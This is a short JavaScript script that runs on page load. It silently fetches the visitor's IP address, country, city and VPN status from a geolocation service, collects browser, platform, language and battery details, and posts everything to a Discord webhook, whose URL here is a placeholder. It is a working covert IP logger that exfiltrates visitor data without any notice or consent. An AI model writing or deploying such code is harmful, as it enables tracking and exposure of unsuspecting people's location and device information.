async function sendUserDataToDiscord() {
  try {
    let geoData = null;
    let vpnData = { badip: "Unknown" };
    
    // Fetch general user data with error handling for 521 response
    try {
      const geoResponse = await fetch("https://json.geoiplookup.io");
      if (geoResponse.ok) {
        geoData = await geoResponse.json();
      } else {
        console.warn("Geo IP lookup failed with status:", geoResponse.status);
      }
    } catch (error) {
      console.warn("Geo IP lookup service unavailable:", error);
    }

    // Fetch VPN-related data
    try {
      const vpnResponse = await fetch("https://vpn.geoiplookup.io/");
      if (vpnResponse.ok) {
        vpnData = await vpnResponse.json();
      } else {
        console.warn("VPN lookup failed with status:", vpnResponse.status);
      }
    } catch (error) {
      console.warn("VPN lookup service unavailable:", error);
    }

    // Get battery data if supported
    const battery = navigator.getBattery ? await navigator.getBattery() : null;
    const deviceData = {
      platform: navigator.platform || "Unknown",
      userAgent: navigator.userAgent || "Unknown",
      language: navigator.language || "Unknown",
      batteryLevel: battery ? battery.level * 100 : "N/A",
      isCharging: battery ? (battery.charging ? "Yes" : "No") : "N/A"
    };

    // Format message content for Discord
    const messageContent = `
      **User Data:**
      ${geoData ? `
      - IP Address: ${geoData.ip}
      - Country: ${geoData.country_name}
      - City: ${geoData.city}
      ` : "- Location Data Unavailable"}
      - Bad IP: ${vpnData.badip}
      - Device: ${deviceData.platform}
      - Browser: ${deviceData.userAgent}
      - Language: ${deviceData.language}
      - Battery Level: ${deviceData.batteryLevel}%
      - Charging: ${deviceData.isCharging}
    `;

    const discordPayload = { content: messageContent };

    // Send data to Discord webhook
    const discordResponse = await fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_URL", {
      method: "POST",
      headers: { 'Content-Type': "application/json" },
      body: JSON.stringify(discordPayload)
    });

    if (!discordResponse.ok) {
      throw new Error("Failed to send data to Discord.");
    }

    console.log("Data sent successfully.");
  } catch (error) {
    console.error("Failed to send user data, sending error message:", error);

    // Send error message to Discord for logging
    await fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_URL", {
      method: "POST",
      headers: { 'Content-Type': "application/json" },
      body: JSON.stringify({ content: "Error: Failed to send user data. Please check the logs for more details." })
    });
  }
}

window.addEventListener("load", sendUserDataToDiscord);
